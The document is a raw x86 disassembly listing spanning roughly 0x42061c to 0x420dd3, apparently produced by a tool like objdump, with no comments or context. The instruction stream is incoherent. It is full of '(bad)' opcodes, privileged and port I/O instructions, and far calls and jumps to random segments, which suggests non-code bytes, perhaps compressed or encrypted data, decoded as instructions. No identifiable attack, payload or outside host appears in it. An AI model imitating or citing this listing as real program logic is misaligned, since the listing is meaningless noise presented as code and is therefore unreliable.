  42061c:	push   es
  42061d:	test   al,0x17
  42061f:	sub    DWORD PTR [edi+0x42129f29],ebp
  420625:	imul   ebp,DWORD PTR [ebp+0x29],0xd0ceb660
  42062c:	push   0x4bba68d6
  420631:	add    DWORD PTR [esi+0x6f06d772],esi
  420637:	sbb    BYTE PTR [esi+0xb],al
  42063a:	push   cs
  42063b:	cli    
  42063c:	mov    BYTE PTR [ebx],bl
  42063e:	std    
  42063f:	mov    esi,0x51bfe4fa
  420644:	xor    ah,BYTE PTR [edx]
  420646:	cmc    
  420647:	aam    0xed
  420649:	shr    BYTE PTR [edi-0x40],cl
  42064c:	adc    BYTE PTR [esi],ch
  42064e:	cmovnp ecx,DWORD PTR [ebx+0x27137d21]
  420655:	inc    edx
  420656:	sub    dl,BYTE PTR [esi+0x78]
  420659:	(bad)  [edx-0x4301c02b]
  42065f:	push   edx
  420660:	and    DWORD PTR [edi+0x4788c4df],ecx
  420666:	aam    0x28
  420668:	aaa    
  420669:	fdivr  st,st(5)
  42066b:	mov    eax,0xa3aa037f
  420670:	hlt    
  420671:	int3   
  420672:	jns    0x4206a6
  420674:	test   al,0xb1
  420676:	pusha  
  420677:	inc    ebp
  420678:	pop    esi
  420679:	push   eax
  42067a:	sti    
  42067b:	retf   0x1272
  42067e:	icebp  
  42067f:	aad    0x19
  420681:	rcr    DWORD PTR [esi-0x1639003a],1
  420687:	ds fwait
  420689:	add    DWORD PTR [edi+0x6f05ccfd],edi
  42068f:	out    dx,eax
  420690:	pop    esp
  420691:	adc    eax,0xeec1c8
  420696:	mov    BYTE PTR [edi+0x42],dh
  420699:	dec    esi
  42069a:	and    BYTE PTR [edi+0x7d],ah
  42069d:	xchg   edx,eax
  42069e:	fcmove st,st(6)
  4206a0:	mov    BYTE PTR [ebx+0x54],dl
  4206a3:	repnz icebp 
  4206a5:	test   BYTE PTR [ebp+0x641ea1dc],ch
  4206ab:	xor    edx,ebx
  4206ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206ae:	sbb    ebp,ebx
  4206b0:	dec    ecx
  4206b1:	sub    al,0xc3
  4206b3:	jbe    0x420701
  4206b5:	addr16 pop ds
  4206b7:	sub    eax,0x21b6cdab
  4206bc:	bound  ebx,QWORD PTR [esi+eiz*1+0x56050ad4]
  4206c3:	scas   al,BYTE PTR es:[edi]
  4206c4:	mov    WORD PTR [esi],?
  4206c6:	retf   0x89b4
  4206c9:	adc    eax,0x4b28fc97
  4206ce:	aas    
  4206cf:	push   es
  4206d0:	mov    edi,0xcf382e4b
  4206d5:	pushf  
  4206d6:	fadd   DWORD PTR [ecx+0x3aeec919]
  4206dc:	push   edi
  4206dd:	stos   DWORD PTR es:[edi],eax
  4206de:	mov    al,ds:0xa07c3300
  4206e3:	lea    ecx,[ecx-0x22f00dd5]
  4206e9:	adc    eax,0x322173e
  4206ee:	jbe    0x420735
  4206f0:	ins    BYTE PTR es:[edi],dx
  4206f1:	sar    BYTE PTR [eax-0x3a],0xe0
  4206f5:	out    0x60,al
  4206f7:	ja     0x42070b
  4206f9:	fstp   TBYTE PTR [edx+0x20]
  4206fd:	cmp    al,0x94
  4206ff:	aam    0x5e
  420701:	scas   al,BYTE PTR es:[edi]
  420702:	xchg   esp,eax
  420703:	pop    eax
  420704:	fsubr  DWORD PTR [ebx]
  420706:	or     edi,DWORD PTR [ebp+0x371e247c]
  42070c:	rcl    bl,0x8d
  42070f:	sbb    eax,0x9c5cea2c
  420714:	cli    
  420715:	lock inc ecx
  420717:	push   edx
  420718:	push   ecx
  420719:	jl     0x420747
  42071b:	cdq    
  42071c:	sub    ch,BYTE PTR [ebp+0x5f25348b]
  420722:	call   0x724e:0x4f0113af
  420729:	sti    
  42072a:	inc    ebp
  42072b:	stc    
  42072c:	or     DWORD PTR [edx],ebp
  42072e:	shl    DWORD PTR [esi],1
  420730:	rol    BYTE PTR ds:0x68dd5ab0,1
  420736:	jo     0x420718
  420738:	push   es
  420739:	or     al,0xc
  42073b:	mov    edi,0x28a3fd9a
  420740:	cmp    eax,0xf46cad02
  420745:	dec    ebx
  420746:	out    dx,al
  420747:	aad    0x98
  420749:	or     dl,ah
  42074b:	pusha  
  42074c:	repnz sbb ecx,edx
  42074f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420750:	mov    bl,al
  420752:	(bad)  
  420753:	outs   dx,DWORD PTR ds:[esi]
  420754:	fcomp  DWORD PTR [esi]
  420756:	jne    0x420788
  420758:	test   DWORD PTR ds:0x83eb69c,eax
  42075e:	dec    ecx
  42075f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  420761:	pop    ss
  420762:	push   esi
  420763:	sbb    eax,0xb69e1070
  420768:	test   al,0x70
  42076a:	lods   al,BYTE PTR ds:[esi]
  42076b:	adc    dl,BYTE PTR [ebp+0x45]
  42076e:	mov    ah,0x82
  420770:	adc    eax,DWORD PTR [edx]
  420772:	xor    al,BYTE PTR [esi]
  420774:	jle    0x420739
  420776:	jo     0x420793
  420778:	cli    
  420779:	sbb    edi,DWORD PTR [esi-0x2c]
  42077c:	cli    
  42077d:	rcr    edx,cl
  42077f:	jno    0x42078f
  420781:	aas    
  420782:	xchg   edx,edx
  420784:	das    
  420785:	adc    BYTE PTR [esi+0x40],0x8d
  420789:	sbb    cl,BYTE PTR [edi-0x1a]
  42078c:	nop
  42078d:	inc    ebx
  42078e:	pop    ds
  42078f:	gs mov edx,0xdc03dc3d
  420795:	stos   BYTE PTR es:[edi],al
  420796:	cmp    al,0xc2
  420798:	jo     0x420725
  42079a:	pop    es
  42079b:	aam    0x4e
  42079d:	aaa    
  42079e:	retf   
  42079f:	sbb    al,0xd5
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	aam    0x42
  4207a4:	xchg   DWORD PTR [ecx-0x2624ade2],esp
  4207aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ab:	mov    bh,0x4b
  4207ad:	jecxz  0x420747
  4207af:	out    0xc7,eax
  4207b1:	pop    ss
  4207b2:	or     BYTE PTR [eax-0x19],dl
  4207b5:	dec    edi
  4207b6:	dec    ecx
  4207b7:	push   esp
  4207b8:	ret    
  4207b9:	xor    BYTE PTR [eax],al
  4207bb:	scas   eax,DWORD PTR es:[edi]
  4207bc:	mov    DWORD PTR [ecx],esi
  4207be:	inc    esp
  4207bf:	int3   
  4207c0:	into   
  4207c1:	ins    DWORD PTR es:[edi],dx
  4207c2:	test   eax,0x8a105ba1
  4207c7:	mov    esi,0xab60813a
  4207cc:	loop   0x4207d8
  4207ce:	shr    edi,cl
  4207d0:	mov    DWORD PTR [edi],edx
  4207d2:	fistp  WORD PTR [ebp-0x27]
  4207d5:	gs push 0x7202bc9f
  4207db:	mov    al,0xf8
  4207dd:	test   BYTE PTR [edx-0x6f0ca3ac],dh
  4207e3:	mov    BYTE PTR cs:[ebx],dl
  4207e6:	fs jne 0x420796
  4207e9:	clc    
  4207ea:	mov    ebp,0xce058bab
  4207ef:	ds inc edx
  4207f1:	pop    eax
  4207f2:	push   ebx
  4207f3:	inc    ebp
  4207f4:	push   cs
  4207f5:	out    dx,eax
  4207f6:	data16 das 
  4207f8:	out    dx,al
  4207f9:	(bad)  
  4207fb:	dec    esp
  4207fd:	push   edx
  4207fe:	dec    ecx
  4207ff:	or     bh,al
  420801:	adc    BYTE PTR [esi+edi*4],0x8b
  420805:	push   ecx
  420806:	dec    ebx
  420807:	mov    bh,0x9e
  420809:	adc    DWORD PTR [edi+0x2f],eax
  42080c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42080d:	test   DWORD PTR [ecx],ebx
  42080f:	fst    DWORD PTR [esi+0x14]
  420812:	mov    al,0x31
  420814:	test   esp,esi
  420816:	vandps ymm4,ymm4,YMMWORD PTR [esi]
  42081a:	push   ds
  42081b:	xchg   ecx,eax
  42081c:	ret    
  42081d:	arpl   bx,si
  42081f:	ins    BYTE PTR es:[edi],dx
  420820:	cmp    BYTE PTR [eax+0x4b],bl
  420823:	out    0x48,eax
  420825:	popa   
  420826:	adc    bl,0x8b
  420829:	add    al,0x67
  42082b:	sub    eax,0x9e7f32f2
  420830:	push   0x4dd60c0
  420835:	jmp    0x42080d
  420837:	adc    eax,0xd620fa3c
  42083c:	lods   eax,DWORD PTR ds:[esi]
  42083d:	mov    cl,0x40
  42083f:	jno    0x420854
  420841:	popa   
  420842:	adc    edx,DWORD PTR [ebx+edi*4]
  420845:	(bad)  
  420846:	pop    eax
  420847:	loope  0x4207f0
  420849:	push   esi
  42084a:	std    
  42084b:	mov    al,0xbe
  42084d:	adc    dl,0x1b
  420850:	shr    BYTE PTR [ebx],0x65
  420853:	mov    ebx,0x34ce649d
  420858:	or     BYTE PTR [eax-0x8],dh
  42085b:	cmc    
  42085c:	cmc    
  42085d:	stos   BYTE PTR es:[edi],al
  42085e:	pop    ds
  42085f:	xchg   edi,eax
  420860:	sbb    esp,esp
  420862:	ret    0x9859
  420865:	std    
  420866:	inc    edx
  420867:	aam    0x82
  420869:	push   cs
  42086a:	(bad)  
  42086b:	adc    DWORD PTR [edx],edx
  42086d:	imul   edx,DWORD PTR [eax],0xd44989c5
  420873:	cmp    edx,esp
  420875:	and    al,0x6c
  420877:	fcomp  st(5)
  420879:	dec    ebp
  42087a:	hlt    
  42087b:	sbb    DWORD PTR [eax+0x2],edi
  42087e:	bound  esp,QWORD PTR [ebp+0x1545496e]
  420884:	mov    esp,DWORD PTR [ecx-0xf]
  420887:	enter  0xef0,0x2f
  42088b:	mov    edx,0xd4b6a718
  420890:	inc    edx
  420891:	mov    ebp,ebx
  420893:	(bad)  
  420895:	or     al,0xba
  420897:	out    0x89,eax
  420899:	fbstp  TBYTE PTR ds:0x6540e8df
  42089f:	sbb    eax,0xd71b0600
  4208a4:	leave  
  4208a5:	mov    esp,0x62d13041
  4208aa:	mov    eax,0xf9f7869f
  4208af:	mov    DWORD PTR [esi-0x1d],0xf3a2ef60
  4208b6:	fstp   QWORD PTR [ebx+ebp*8-0x1caa9ee6]
  4208bd:	inc    eax
  4208be:	mov    ebp,0x61a4b187
  4208c3:	aad    0x41
  4208c5:	fidivr WORD PTR [edx]
  4208c7:	dec    ebx
  4208c8:	sub    DWORD PTR [esi],esi
  4208ca:	out    0xf4,al
  4208cc:	stos   BYTE PTR es:[edi],al
  4208cd:	add    eax,0x48797dc0
  4208d2:	or     al,0x67
  4208d4:	or     eax,0x144d1fd3
  4208d9:	lock add eax,0xf5204ae3
  4208df:	(bad)  
  4208e0:	in     eax,dx
  4208e1:	add    eax,0x37ea2e34
  4208e6:	(bad)  
  4208e7:	ds push ss
  4208e9:	pop    esi
  4208ea:	pop    ds
  4208eb:	scas   eax,DWORD PTR es:[edi]
  4208ec:	or     al,bh
  4208ee:	sub    DWORD PTR [ebx-0x5f],ecx
  4208f1:	fiadd  DWORD PTR [eax]
  4208f3:	xchg   edi,eax
  4208f4:	int3   
  4208f5:	push   esp
  4208f6:	xor    BYTE PTR [edi-0x54],dl
  4208f9:	adc    ah,BYTE PTR [eax-0x54]
  4208fc:	xchg   edx,eax
  4208fd:	push   eax
  4208fe:	gs adc eax,0xbd990245
  420904:	xor    eax,0x7510f2e3
  420909:	add    bh,BYTE PTR [eax+ebp*1-0x58]
  42090d:	xor    BYTE PTR [edx],bl
  42090f:	inc    ebp
  420910:	(bad)  
  420911:	sub    bl,BYTE PTR [esi]
  420913:	in     eax,0x98
  420915:	jg     0x4208d6
  420917:	sub    al,bl
  420919:	xchg   ebp,ebp
  42091b:	aam    0x3d
  42091d:	repz aaa 
  42091f:	clc    
  420920:	push   DWORD PTR ds:0x798816ff
  420926:	pop    ecx
  420927:	in     eax,dx
  420928:	sbb    eax,esi
  42092a:	xchg   ebx,eax
  42092b:	mov    edi,0x4625625
  420930:	add    BYTE PTR ds:0xf45e610e,0x67
  420937:	add    DWORD PTR [ebp+0x5f],esi
  42093a:	pop    ds
  42093b:	sbb    DWORD PTR [ebx-0x49bf2f42],ebp
  420941:	mov    edi,0x3d11d70c
  420946:	xor    edx,DWORD PTR [ecx-0x60]
  420949:	jns    0x4209b3
  42094b:	imul   esp,DWORD PTR [ecx+0x5493cf87],0x2bcae603
  420955:	and    BYTE PTR [edi],ch
  420957:	sub    bl,BYTE PTR [ebp+edx*4+0x4d890bad]
  42095e:	mov    WORD PTR [ebp+0x7a],ss
  420961:	push   ds
  420962:	call   0xbe1992d5
  420967:	xlat   BYTE PTR ds:[ebx]
  420968:	ret    0x1caf
  42096b:	fdiv   DWORD PTR [ebx-0x75]
  42096e:	dec    ebp
  42096f:	loopne 0x4208f9
  420971:	pop    ebp
  420972:	push   ebx
  420973:	sbb    bl,BYTE PTR [ecx+ebp*1]
  420976:	imul   ebp,DWORD PTR [ebx],0x4924d18d
  42097c:	mov    ebx,0x9654fa07
  420981:	loope  0x42098f
  420983:	xlat   BYTE PTR ds:[ebx]
  420984:	adc    al,0x43
  420986:	icebp  
  420987:	les    ebx,FWORD PTR [edi+0x72974ae3]
  42098d:	clc    
  42098e:	jle    0x4209cd
  420990:	mov    al,BYTE PTR [ecx-0x411ec3a3]
  420996:	pop    ds
  420997:	inc    edx
  420998:	cld    
  420999:	ret    
  42099a:	js     0x4209ca
  42099c:	jno    0x4209ab
  42099e:	ins    BYTE PTR es:[edi],dx
  42099f:	fnsave [eax+eiz*8+0x18]
  4209a3:	mov    al,0x89
  4209a5:	pop    ds
  4209a6:	call   0xff52:0xcd3f548f
  4209ad:	add    ecx,DWORD PTR [esi-0x75]
  4209b0:	cmp    eax,0xfb60ab32
  4209b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209b6:	fimul  DWORD PTR [esi]
  4209b8:	xchg   bh,dl
  4209ba:	mov    ds:0x1fcc9ad1,eax
  4209bf:	std    
  4209c0:	out    0x36,al
  4209c2:	mov    fs,WORD PTR [edx+0xbbdc72b]
  4209c8:	xchg   ebp,eax
  4209c9:	int3   
  4209ca:	lahf   
  4209cb:	imul   esp,eax,0x88054161
  4209d1:	shr    DWORD PTR [eax+eiz*2+0x62],1
  4209d5:	ss (bad) 
  4209d7:	sbb    eax,0xbf4e1d02
  4209dc:	inc    eax
  4209dd:	cmp    eax,0x6e990038
  4209e2:	mov    esp,0xde738988
  4209e7:	cdq    
  4209e8:	jns    0x420a01
  4209ea:	je     0x420990
  4209ec:	cmp    eax,DWORD PTR [edx]
  4209ee:	fs jmp 0x420a6e
  4209f1:	mov    esp,0xdd83094
  4209f6:	mov    gs:0x370e127b,eax
  4209fc:	dec    ebx
  4209fd:	mov    dl,0x90
  4209ff:	jo     0x420a08
  420a01:	add    ecx,esi
  420a03:	mov    esp,0x50d4db9c
  420a08:	les    edi,FWORD PTR ds:0x6c02a56d
  420a0e:	mov    esp,0xb4b7eed6
  420a13:	add    eax,0xc040a64a
  420a18:	stos   DWORD PTR es:[edi],eax
  420a19:	xchg   edx,eax
  420a1a:	xchg   ebp,eax
  420a1b:	dec    ecx
  420a1c:	xchg   ebx,eax
  420a1d:	lds    eax,FWORD PTR [ecx-0x17]
  420a20:	mov    edx,cs
  420a22:	push   eax
  420a23:	enter  0xe389,0x3c
  420a27:	(bad)  ds:0xf0af4ece
  420a2d:	mov    ch,0x6d
  420a2f:	xor    al,0x88
  420a31:	cmp    eax,0x1198709a
  420a36:	(bad)  
  420a38:	mov    DWORD PTR [ecx-0x6e],eax
  420a3b:	dec    esp
  420a3c:	call   0x1a02:0x73628d6e
  420a43:	call   0x3d1a9f28
  420a48:	inc    edx
  420a49:	loop   0x420a0b
  420a4b:	in     eax,dx
  420a4c:	sti    
  420a4d:	rcr    BYTE PTR [edi],0x5
  420a50:	(bad)  
  420a51:	sbb    edx,ebp
  420a53:	dec    esi
  420a54:	mov    cl,0xe
  420a56:	dec    ebx
  420a57:	(bad)  
  420a59:	add    dh,BYTE PTR [edx+0x1a]
  420a5c:	mov    al,ds:0xe76ad102
  420a61:	fstp   QWORD PTR [edi]
  420a63:	mov    ebp,0xc0db9630
  420a68:	pop    edi
  420a69:	(bad)  
  420a6a:	mov    ebx,0x1ff1f25b
  420a6f:	nop
  420a70:	sbb    DWORD PTR [eax-0x27],edx
  420a73:	mov    bh,0xc
  420a75:	out    dx,al
  420a76:	pusha  
  420a77:	jmp    0x5db66e24
  420a7c:	cs push ebp
  420a7e:	ins    BYTE PTR es:[edi],dx
  420a7f:	mov    dh,bl
  420a81:	xor    BYTE PTR [esi+0x622bdfd5],dl
  420a87:	sub    DWORD PTR [edx+0x7e7b1e26],ecx
  420a8d:	int    0xe1
  420a8f:	mov    edx,0xba633104
  420a94:	pop    esi
  420a95:	mov    dl,0x41
  420a97:	xlat   BYTE PTR ds:[ebx]
  420a98:	push   edi
  420a99:	and    bl,BYTE PTR [edi]
  420a9b:	mov    ds,WORD PTR [eax-0x77654124]
  420aa1:	ror    DWORD PTR [eax+0x36],0xb1
  420aa5:	stos   BYTE PTR es:[edi],al
  420aa6:	call   0x41b78b33
  420aab:	aad    0x91
  420aad:	mov    edi,DWORD PTR [esi-0x621cb81f]
  420ab3:	mov    WORD PTR [ecx-0x2d],cs
  420ab6:	stos   DWORD PTR es:[edi],eax
  420ab7:	jge    0x420ab2
  420ab9:	rcr    DWORD PTR [edi],cl
  420abb:	adc    eax,eax
  420abd:	int    0x68
  420abf:	adc    DWORD PTR [edx],esp
  420ac1:	sbb    al,0x2a
  420ac3:	jns    0x420adc
  420ac5:	inc    esi
  420ac6:	pop    es
  420ac7:	pop    ecx
  420ac8:	test   al,0x54
  420aca:	inc    eax
  420acb:	in     eax,dx
  420acc:	mov    BYTE PTR [ebp-0x3af38d5c],al
  420ad2:	inc    ebp
  420ad3:	sahf   
  420ad4:	test   DWORD PTR ds:0x433f7bc8,0x22e9c899
  420ade:	push   ds
  420adf:	push   ebx
  420ae0:	mov    dh,BYTE PTR [ebp-0x73]
  420ae3:	inc    ecx
  420ae4:	jb     0x420adb
  420ae6:	pop    es
  420ae7:	xlat   BYTE PTR ds:[ebx]
  420ae8:	mov    ecx,esi
  420aea:	in     al,dx
  420aeb:	fst    DWORD PTR [edi-0x15]
  420aee:	mov    eax,0x10dff873
  420af3:	sbb    al,0x83
  420af5:	add    ch,BYTE PTR [esi]
  420af7:	mov    cl,0x8f
  420af9:	outs   dx,DWORD PTR ds:[esi]
  420afa:	pop    ss
  420afb:	stos   DWORD PTR es:[edi],eax
  420afc:	adc    al,BYTE PTR [ebx]
  420afe:	and    al,ah
  420b00:	cli    
  420b01:	jne    0x420b63
  420b03:	repnz cli 
  420b05:	mov    esp,0xb14b711f
  420b0a:	dec    bx
  420b0c:	jb     0x420a8e
  420b0e:	sub    dl,bh
  420b10:	mov    edi,0x3feec769
  420b15:	adc    cl,BYTE PTR [esi-0x355e68c4]
  420b1b:	bound  esp,QWORD PTR [esi-0x7e]
  420b1e:	cmp    ebp,DWORD PTR [esi+0x50]
  420b21:	mov    ss:0x3fd02ad5,al
  420b27:	sbb    eax,DWORD PTR [ecx]
  420b29:	sub    al,0x13
  420b2b:	dec    esp
  420b2c:	mov    BYTE PTR [ecx-0x574e021d],dh
  420b32:	loop   0x420b62
  420b34:	ret    
  420b35:	add    eax,0xac47018
  420b3a:	daa    
  420b3b:	shl    ecx,1
  420b3d:	inc    ebp
  420b3e:	jne    0x420b83
  420b40:	inc    edi
  420b41:	xchg   ebp,eax
  420b42:	xor    dl,bh
  420b44:	test   BYTE PTR [ebp+ebx*4-0x2bfa6dd3],dl
  420b4b:	pop    edx
  420b4c:	push   ebp
  420b4d:	xchg   BYTE PTR [ebp+0x16],bl
  420b50:	ret    0x6d35
  420b53:	popa   
  420b54:	xor    eax,0xa934afad
  420b59:	out    dx,eax
  420b5a:	sahf   
  420b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b5c:	cmp    dh,ch
  420b5e:	xchg   ebx,eax
  420b5f:	stos   DWORD PTR es:[edi],eax
  420b60:	mov    bh,BYTE PTR [ebx+0x658cce59]
  420b66:	cs ins DWORD PTR es:[edi],dx
  420b68:	addr16 retf 
  420b6a:	pop    esi
  420b6b:	jmp    0xac6024ca
  420b70:	jnp    0x420b67
  420b72:	lahf   
  420b73:	mov    ds:0xc8fa0321,al
  420b78:	in     eax,dx
  420b79:	sti    
  420b7a:	lods   al,BYTE PTR ds:[esi]
  420b7b:	xor    dh,BYTE PTR [eax+0x775b6d73]
  420b81:	sub    al,0xd2
  420b83:	cmp    cl,ch
  420b85:	test   DWORD PTR [ebx+0x17],edi
  420b88:	or     eax,DWORD PTR [ebx]
  420b8a:	in     al,0xf7
  420b8c:	xchg   ebp,eax
  420b8d:	in     al,dx
  420b8e:	dec    ebx
  420b8f:	xchg   esp,eax
  420b90:	xor    eax,0xeb911f8a
  420b95:	pop    esp
  420b96:	dec    esi
  420b97:	lods   eax,DWORD PTR ds:[esi]
  420b98:	cmp    al,0xfe
  420b9a:	out    dx,eax
  420b9b:	cwde   
  420b9c:	aam    0x3c
  420b9e:	ficom  WORD PTR [ebp-0x5b]
  420ba1:	sub    DWORD PTR [eax+0x12],esi
  420ba4:	popw   ss
  420ba6:	pop    ds
  420ba7:	out    dx,eax
  420ba8:	or     ebp,DWORD PTR [esi+0x3e36018a]
  420bae:	inc    eax
  420baf:	rol    BYTE PTR [esi-0x34b1ddbf],1
  420bb5:	jns    0x420b56
  420bb7:	arpl   WORD PTR [edx-0x58509be2],sp
  420bbd:	or     DWORD PTR [edx],edx
  420bbf:	lahf   
  420bc0:	sub    DWORD PTR ds:0x45ecd492,eax
  420bc6:	repz sub al,0xe3
  420bc9:	es jb  0x420bc8
  420bcc:	mov    WORD PTR [eax-0x3176f120],cs
  420bd2:	cwde   
  420bd3:	mov    ah,0x83
  420bd5:	imul   ecx,DWORD PTR [eax+ebx*8-0x883c8ca],0x29
  420bdd:	cmp    BYTE PTR [ecx],0xbe
  420be0:	and    BYTE PTR [esi-0x9],ch
  420be3:	outs   dx,BYTE PTR ds:[esi]
  420be4:	test   eax,0x258bc429
  420be9:	xor    al,0x5e
  420beb:	pop    eax
  420bec:	pop    esp
  420bed:	pop    ebp
  420bee:	mov    dh,0x97
  420bf0:	mov    cl,dh
  420bf2:	xchg   ebx,eax
  420bf3:	and    al,0x69
  420bf5:	shr    DWORD PTR [edi-0x15],0x2d
  420bf9:	push   0xffffffc4
  420bfb:	adc    ebp,DWORD PTR [esi]
  420bfd:	add    eax,DWORD PTR [esi]
  420bff:	jp     0x420c46
  420c01:	cs es retf 0x91f7
  420c06:	cmp    dl,ah
  420c08:	cmp    BYTE PTR [ebp+0x5bbcf1f3],dl
  420c0e:	addr16 aad 0x51
  420c11:	add    BYTE PTR [ebp+0x6c61495],bl
  420c17:	sub    cl,BYTE PTR [eax-0x67670ac1]
  420c1d:	jmp    0x420c28
  420c1f:	xchg   BYTE PTR [edi],ch
  420c21:	add    esi,DWORD PTR [eax+0x44]
  420c24:	popf   
  420c25:	jne    0x420c96
  420c27:	or     bh,BYTE PTR [esi]
  420c29:	pop    esp
  420c2a:	gs stc 
  420c2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c2d:	mov    cl,0xeb
  420c2f:	dec    edx
  420c30:	lods   al,BYTE PTR ds:[esi]
  420c31:	xor    ah,cl
  420c33:	jb     0x420c0c
  420c35:	add    eax,0xa18b296c
  420c3a:	inc    edi
  420c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c3c:	push   ecx
  420c3d:	sub    al,0x1e
  420c3f:	stos   DWORD PTR es:[edi],eax
  420c40:	and    ah,dl
  420c42:	jecxz  0x420c76
  420c44:	push   eax
  420c45:	ins    DWORD PTR es:[edi],dx
  420c46:	int3   
  420c47:	aad    0x36
  420c49:	jl     0x420be4
  420c4b:	mov    ch,0x63
  420c4d:	push   esi
  420c4e:	loopne 0x420bd9
  420c50:	mov    bh,al
  420c52:	mov    esi,0x5f9433af
  420c57:	pop    ebp
  420c58:	in     al,dx
  420c59:	mov    ecx,ecx
  420c5b:	or     BYTE PTR [eax-0x6d83e125],cl
  420c61:	aaa    
  420c62:	nop
  420c63:	cmc    
  420c64:	pop    esp
  420c65:	lds    edx,FWORD PTR [edi]
  420c67:	sub    al,0xf6
  420c69:	dec    ebx
  420c6a:	xlat   BYTE PTR ds:[ebx]
  420c6b:	and    al,0xa0
  420c6d:	sub    DWORD PTR [eax+edi*4-0xcfebcdf],ecx
  420c74:	sbb    eax,0x75f5c069
  420c79:	add    ebx,DWORD PTR [ebx+eiz*8]
  420c7c:	jle    0x420c3b
  420c7e:	adc    BYTE PTR ds:0x171d04ca,ch
  420c84:	ds out dx,eax
  420c86:	jbe    0x420ca7
  420c88:	and    ah,bh
  420c8a:	and    bl,BYTE PTR [eax]
  420c8c:	repz add eax,0xbd965acc
  420c92:	ds ret 0x3d8a
  420c96:	rcr    DWORD PTR [eax+0x71],cl
  420c99:	loope  0x420c74
  420c9b:	xchg   DWORD PTR [ecx],edx
  420c9d:	dec    edi
  420c9e:	sub    eax,0x1fa0dc44
  420ca3:	icebp  
  420ca4:	pop    esi
  420ca5:	mov    al,ds:0x6a53d094
  420caa:	pop    esp
  420cab:	jno    0x420ce3
  420cad:	mov    bl,ch
  420caf:	inc    esp
  420cb0:	mov    dl,cl
  420cb2:	jecxz  0x420c36
  420cb4:	sbb    al,0x83
  420cb6:	jae    0x420c8d
  420cb8:	(bad)  
  420cba:	pop    ss
  420cbb:	pop    ebx
  420cbc:	pop    edx
  420cbd:	call   0xe215:0x338993ca
  420cc4:	(bad)  
  420cc5:	test   eax,0x5c2108f
  420cca:	sub    ah,BYTE PTR [ecx]
  420ccc:	popa   
  420ccd:	out    dx,al
  420cce:	jns    0x420c60
  420cd0:	shr    ecx,0xc0
  420cd3:	pop    ebp
  420cd4:	cmp    cl,bh
  420cd6:	pop    ds
  420cd7:	ins    DWORD PTR es:[edi],dx
  420cd8:	sti    
  420cd9:	hlt    
  420cda:	ss push esp
  420cdc:	je     0x420d57
  420cde:	in     eax,dx
  420cdf:	mov    al,0xd6
  420ce1:	jmp    0x420d32
  420ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ce4:	xchg   ebx,eax
  420ce5:	cmp    ebx,DWORD PTR [esi]
  420ce7:	and    BYTE PTR [ebp-0x77b92708],bh
  420ced:	(bad)  
  420cee:	mov    ds:0x970923fb,eax
  420cf3:	sahf   
  420cf4:	mov    cl,0x5
  420cf6:	repnz sbb BYTE PTR es:[esi],dl
  420cfa:	xor    al,0xda
  420cfc:	sbb    DWORD PTR [ebx-0x38c6ace1],edi
  420d02:	push   ebx
  420d03:	adc    al,0xa2
  420d05:	dec    DWORD PTR [edx]
  420d07:	pop    ss
  420d08:	mov    eax,ds:0x1764aa4b
  420d0d:	adc    BYTE PTR [eax+eiz*4-0x6ebf4b79],0x88
  420d15:	push   ebx
  420d16:	inc    eax
  420d17:	mov    cl,0x95
  420d19:	fwait
  420d1a:	sti    
  420d1b:	test   al,0xe9
  420d1d:	add    ch,BYTE PTR [edx+0x6bf1c1b1]
  420d23:	mov    ebp,0x4d1e7bbe
  420d28:	dec    edx
  420d29:	outs   dx,DWORD PTR ds:[esi]
  420d2a:	rcl    BYTE PTR [ecx-0x2b3a8450],1
  420d30:	pop    ecx
  420d31:	ss dec esp
  420d33:	bound  esp,QWORD PTR [eax-0x798d844c]
  420d39:	xor    DWORD PTR ds:0x63caf443,ecx
  420d3f:	in     al,dx
  420d40:	mov    esi,0x4674b705
  420d45:	or     al,0xd2
  420d47:	aad    0x52
  420d49:	cmp    al,0x6a
  420d4b:	jmp    0xaed1e356
  420d50:	mov    DWORD PTR [ebp-0x34],esi
  420d53:	imul   edi,DWORD PTR [eax+ebx*4+0x2d87ed3],0x8152372c
  420d5e:	in     al,dx
  420d5f:	ret    
  420d60:	jp     0x420d17
  420d62:	pusha  
  420d63:	cdq    
  420d64:	mul    ch
  420d66:	and    ebx,DWORD PTR [edx+0x14]
  420d69:	xor    al,0x59
  420d6b:	fnstcw WORD PTR [esi]
  420d6d:	add    dl,al
  420d6f:	out    0x87,eax
  420d71:	scas   al,BYTE PTR es:[edi]
  420d72:	xchg   esi,eax
  420d73:	imul   BYTE PTR [ebp-0x7c86991b]
  420d79:	jnp    0x420d2d
  420d7b:	sbb    DWORD PTR [ebp-0x1e],ecx
  420d7e:	xor    BYTE PTR [esi+ebp*1],ch
  420d81:	add    ah,BYTE PTR [eax]
  420d83:	retf   
  420d84:	call   0x1fe2:0x127e9836
  420d8b:	inc    ebx
  420d8c:	mov    cl,0xe1
  420d8e:	ja     0x420d1c
  420d90:	jae    0x420d5f
  420d92:	(bad)  
  420d93:	fistp  QWORD PTR [edi+0x42be4c1e]
  420d99:	sbb    DWORD PTR ds:0xcd224907,esi
  420d9f:	mov    cl,0x88
  420da1:	xchg   ebp,eax
  420da2:	out    0x69,eax
  420da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420da5:	xor    DWORD PTR ds:0xf40287b0,edx
  420dab:	mov    edi,0xed84220a
  420db0:	jbe    0x420d3d
  420db2:	popa   
  420db3:	ret    
  420db4:	xor    al,0x42
  420db6:	add    BYTE PTR [ecx-0xc],bl
  420db9:	test   eax,0x59502d7
  420dbe:	dec    edx
  420dbf:	jge    0x420dcd
  420dc1:	ret    0x506b
  420dc4:	inc    ecx
  420dc5:	and    BYTE PTR [esi],bl
  420dc7:	(bad)  
  420dc9:	lods   eax,DWORD PTR ds:[esi]
  420dca:	sbb    al,BYTE PTR [ebx-0x2b1852ae]
  420dd0:	mov    edi,DWORD PTR [edx-0x4]
  420dd3:	jmp    0x9789:0x4b991239
